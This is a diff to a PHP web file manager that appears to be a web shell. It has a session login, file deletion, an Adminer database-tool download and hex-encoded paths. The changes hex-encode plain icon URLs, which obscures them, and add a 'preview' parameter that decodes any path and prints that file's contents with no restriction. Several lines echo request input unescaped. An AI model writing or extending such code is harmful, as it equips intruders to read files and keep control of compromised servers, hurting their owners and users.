@@ -85,7 +85,7 @@ if (!isset($_SESSION['login'])) {
 <meta name="viewport" content="width=device-width,height=device-height initial-scale=1">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/flexboxgrid/6.3.1/flexboxgrid.min.css" type="text/css" >
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"/>
-
+<title>._.</title>
 <style type="text/css">
 	@import url('https://fonts.googleapis.com/css2?family=Open+Sans&display=swap');
 	@import url('https://fonts.googleapis.com/css2?family=Ubuntu:ital@1&display=swap');
@@ -160,6 +160,7 @@ if (!isset($_SESSION['login'])) {
 		border-radius:5px;
 		padding: 10px;
 	}
+	#alertBox #closeBtn:hover, 
 	div.tool a:hover,
 	input[type=submit]:hover {
 		cursor: pointer;
@@ -359,6 +360,12 @@ if (!isset($_SESSION['login'])) {
 	.perms {
 		text-align: center;
 	}
+	textarea.preview {
+		padding:0;
+		height:530px;
+		border: none;
+		background: none;
+	}
 	textarea::placeholder {
 		color: red;
 		opacity: 1;
@@ -400,7 +407,7 @@ if (!isset($_SESSION['login'])) {
 
 	#alertBox h1 {
 		margin:0;
-		font-family: 'Titillium Web', sans-serif;
+		font-family: 'Open Sans', sans-serif;
 		color:#000;
 		border-bottom: 1px solid rgba(222,222,222,0.73);
 		border-radius: 10px 10px 00px 0px;
@@ -408,7 +415,7 @@ if (!isset($_SESSION['login'])) {
 	}
 
 	#alertBox p {
-		font-family: 'Titillium Web', sans-serif;
+		font-family: 'Open Sans', sans-serif;
 		height:50px;
 		margin-left:16px;
 	}
@@ -421,11 +428,12 @@ if (!isset($_SESSION['login'])) {
 		padding:7px 100px;
 		border-radius:7px;
 		width:70px;
-		font-family: 'Titillium Web', sans-serif;
+		font-family: 'Open Sans', sans-serif;
 		text-transform:uppercase;
 		text-align:center;
-		color: #8a8a8a;
-		background-color:rgba(222,222,222,0.73);
+		color: #1889f5;
+		border: 1px solid var(--color-bg);
+		background-color:var(--color-bg);
 		text-decoration:none;
 	}
 	.navbar {
@@ -793,21 +801,6 @@ function myFunction() {
     			}
     		}
     	}
-    	public static function preview($filename) {
-    		self::$extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
-    		switch (self::$extension) {
-    			case 'png':
-    			case 'jpg':
-    			case 'jpeg':
-    			case 'bmp':
-    			case 'ico':
-    				print("#previewImg");
-    				break;
-    			default:
-    				print("#previewOther");
-    				break;
-    		}
-    	}
     	public static function countDir($filename) {
     		return @count(scandir($filename)) -2;
     	}
@@ -822,53 +815,60 @@ function myFunction() {
         		case 'php6':
         		case 'phtml':
             	case 'php':
-                	print("https://image.flaticon.com/icons/png/128/337/337947.png");
+                	return self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f706e672f3132382f3333372f3333373934372e706e67");
+                	break;
+                case 'md':
+                	return self::unhex("68747470733a2f2f7777772e666c617469636f6e2e636f6d2f7072656d69756d2d69636f6e2f69636f6e732f7376672f323738322f323738323634382e737667");
                 	break;
                 case 'html':
                 case 'htm':
-                	print("https://image.flaticon.com/icons/svg/337/337937.svg");
+                	return self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f3333372f3333373933372e737667");
                 	break;
                 case 'txt':
-                	print("https://image.flaticon.com/icons/svg/3022/3022305.svg");
+                	return self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f333032322f333032323330352e737667");
+                	break;
+                case 'json':
+                	return self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f3133362f3133363532352e737667");
                 	break;
                 case 'xml':
-                	print("https://www.flaticon.com/premium-icon/icons/svg/2656/2656443.svg");
+                	return self::unhex("68747470733a2f2f7777772e666c617469636f6e2e636f6d2f7072656d69756d2d69636f6e2f69636f6e732f7376672f323635362f323635363434332e737667");
                 	break;
                 case 'png':
-                	print("https://image.flaticon.com/icons/svg/337/337948.svg");
+                	return self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f3333372f3333373934382e737667");
                 	break;
                 case 'ico':
-                	print("https://www.flaticon.com/premium-icon/icons/svg/2266/2266805.svg");
+                	return self::unhex("68747470733a2f2f7777772e666c617469636f6e2e636f6d2f7072656d69756d2d69636f6e2f69636f6e732f7376672f323236362f323236363830352e737667");
                 	break;
                 case 'jpg':
-                	print("https://image.flaticon.com/icons/svg/136/136524.svg");
+                	return self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f3133362f3133363532342e737667");
                 	break;
                 case 'css':
-                	print("https://image.flaticon.com/icons/svg/2306/2306041.svg");
+                	return self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f323330362f323330363034312e737667");
                 	break;
                 case 'js':
-                	print("https://image.flaticon.com/icons/svg/1126/1126856.svg");
+                	return self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f313132362f313132363835362e737667");
                 	break;
                 case 'pdf':
-                	print("https://www.flaticon.com/premium-icon/icons/svg/2889/2889358.svg");
+                	return self::unhex("68747470733a2f2f7777772e666c617469636f6e2e636f6d2f7072656d69756d2d69636f6e2f69636f6e732f7376672f323838392f323838393335382e737667");
                 	break;
                 case 'mp3':
-                	print("https://image.flaticon.com/icons/svg/2611/2611401.svg");
+                	return self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f323631312f323631313430312e737667");
                 	break;
                 case 'mp4':
-                	print("https://image.flaticon.com/icons/svg/1719/1719843.svg");
+                case 'm4a':
+                	return self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f313731392f313731393834332e737667");
                 	break;
                 case 'py':
-                	print("https://www.flaticon.com/premium-icon/icons/svg/172/172546.svg");
+                	return self::unhex("68747470733a2f2f7777772e666c617469636f6e2e636f6d2f7072656d69756d2d69636f6e2f69636f6e732f7376672f3137322f3137323534362e737667");
                 	break;
                 case 'sh':
-                	print("https://image.flaticon.com/icons/svg/617/617535.svg");
+                	return self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f3631372f3631373533352e737667");
                 	break;
                 case 'ini':
-                	print("https://image.flaticon.com/icons/svg/1126/1126890.svg");
+                	return self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f313132362f313132363839302e737667");
                 	break;
             	default:
-                	print("https://image.flaticon.com/icons/svg/833/833524.svg");
+                	return self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f3833332f3833333532342e737667");
                 	break;
         	}
     	}
@@ -1020,6 +1020,36 @@ function myFunction() {
 			if (isset($_GET['logout'])) {
 				logout();
 			}
+			$_GET['preview'] = (isset($_GET['preview'])) ? x::unhex($_GET['preview']) : false;
+			if ($_GET['preview']) {
+				$ext = strtolower(pathinfo($_GET['preview'] , PATHINFO_EXTENSION));
+				switch ($ext) {
+					case 'jpg':
+					case 'png':
+					case 'jpeg':
+					case 'bmp':
+					case 'ico':
+					case 'gif':
+						print("this image ".$_GET['preview']."");
+						break;
+					case 'mp3':
+					case 'ogg':
+					case '3gp':
+						print("this music ".$_GET['preview']."");
+						break;
+					case 'mp4':
+						print("this video ".$_GET['preview']."");
+						break;
+					default:
+						?>
+						<img src="<?= x::getimg($_GET['preview']) ?>" class="icons">
+						<span style="position: fixed;margin:5px;"><?= basename($_GET['preview']) ?></span><br><br>
+						<textarea class="preview" readonly><?= htmlspecialchars(file_get_contents($_GET['preview'])) ?></textarea>
+						<?php
+						exit();
+						break;
+				}
+			}
 			if (isset($_GET['adminer'])) {
 				if (x::adminer("https://www.adminer.org/static/download/4.7.7/adminer-4.7.7.php", "adminer.php")) {
 					print("<script>
@@ -1125,7 +1155,7 @@ function myFunction() {
 			switch (@$_POST['action']) {
 				case 'delete':
 					if (x::delete($_POST['file'])) {
-						print("<script>alert('<h3>success</h3>')</script>");
+						print("<script>alert('<h3>Deleted</i></h3>')</script>");
 					} else {
 						print("<script>alert('<h3>permission danied</h3>')</script>");
 					}
@@ -1185,7 +1215,7 @@ function myFunction() {
 										<form method="post" action="?cd=<?= $_GET['cd'] ?>">
 											<td colspan="3">
 												<div class="button">
-													<button name="action" value="edit">
+													<button onclick="window.location.href='?cd=<?= x::hex($_POST['file']) ?>'">
 														<i class="far fa-edit" title="Edit"></i>&nbsp;
 														Open
 													</button>
@@ -1448,7 +1478,7 @@ function myFunction() {
 							<td>
 								<img class="icons" src="<?= x::getimg($file['name']) ?>">
 								<span class="file" title="<?= basename($file['name']) ?>">
-									<a href="<?= x::preview($file['name']) ?>">
+									<a href="?cd=<?= x::hex(x::cwd()) ?>&preview=<?= x::hex($file['name']) ?>">
 										<?= basename($file['name']) ?>
 									</a>
 								</span>
